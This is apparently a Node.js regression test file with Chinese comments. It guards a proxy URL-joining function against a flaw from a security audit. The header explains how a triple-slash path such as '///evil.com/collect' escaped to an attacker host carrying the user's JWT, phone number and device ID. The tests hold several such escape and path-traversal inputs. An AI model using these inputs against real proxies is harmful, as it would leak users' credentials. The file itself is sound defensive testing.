/**
 * 上游代理地址拼接的安全契约（2026-09-27 安全审计 S4-C0）
 *
 * 漏洞形态：`/dsh-remote/feedback` 是**前缀路由**，后缀直接来自请求路径，
 * 旧代码只剥一个前导斜杠就交给 `new URL()`：
 *   pathname = "/dsh-remote/feedback///evil.com/collect"
 *   suffix   = "///evil.com/collect" → 剥一个 → "//evil.com/collect"  ← 协议相对 URL！
 *   new URL("//evil.com/collect", "https://n.risegao.cn:13443/relay-api/") = https://evil.com/collect
 * 而 proxyFeedback 在没有 Authorization 时会**自动附加本机账号 JWT + 真实手机号 + device_id**
 * —— 一条 GET（`<img>` 即可触发）就把账号凭据送到攻击者主机，凭它能签发设备访问密钥、
 * 配对到攻击者手机 = 用户电脑被完整接管。两斜杠/`%2f`/`..` 都被限制在中继域内，唯独三斜杠逃逸。
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { readFile } from "node:fs/promises";
import { safeUpstreamUrl } from "../lib/index.js";

const BASE = "https://n.risegao.cn:13443/relay-api/";
const ORIGIN = new URL(BASE).origin;

test("正常后缀：拼在基址路径之下，域名与路径前缀都不变", () => {
  assert.equal(safeUpstreamUrl(BASE, "/").href, BASE);
  assert.equal(safeUpstreamUrl(BASE, "/api/feedback").href, `${BASE}api/feedback`);
  assert.equal(safeUpstreamUrl(BASE, "api/feedback?x=1").href, `${BASE}api/feedback?x=1`);
  // 基址没有路径前缀时（自建反馈服务）也应正常
  assert.equal(safeUpstreamUrl("https://fb.example.com", "/api/x").href, "https://fb.example.com/api/x");
});

test("🔴 逃逸形态：三斜杠 / 两斜杠绝不换域（降级为基址下的路径段）", () => {
  for (const suffix of ["///evil.com/collect", "//evil.com/x", "/////evil.com/y"]) {
    const u = safeUpstreamUrl(BASE, suffix);
    assert.equal(u.origin, ORIGIN, `${suffix} 不得逃到别的域，实际 ${u.origin}`);
    assert.ok(u.pathname.startsWith("/relay-api/"), `${suffix} 必须仍在基址路径下，实际 ${u.pathname}`);
  }
});

test("🔴 逃逸形态：绝对 URL 与 .. 路径穿越必须抛错（而不是把凭据发出去）", () => {
  assert.throws(() => safeUpstreamUrl(BASE, "https://evil.com/x"), /origin/);
  assert.throws(() => safeUpstreamUrl("https://h/relay-api/", "/../admin/api/users"), /path/);
  assert.throws(() => safeUpstreamUrl("https://h/relay-api/", "/%2e%2e/admin"), /path/);
  assert.throws(() => safeUpstreamUrl("https://h/relay-api/", "/a/../../b"), /path/);
});

test("源码契约：proxyFeedback 必须走 safeUpstreamUrl（不得再裸 new URL(suffix)）", async () => {
  const src = await readFile(new URL("../lib/index.js", import.meta.url), "utf8");
  assert.ok(!/new URL\(suffix\.replace/.test(src),
    "不得再出现 `new URL(suffix.replace(/^\\//, \"\"), base)` —— 那正是 S4-C0 的漏洞写法");
  assert.match(src, /url = safeUpstreamUrl\(base, suffix\)/, "proxyFeedback 必须调用 safeUpstreamUrl");
});
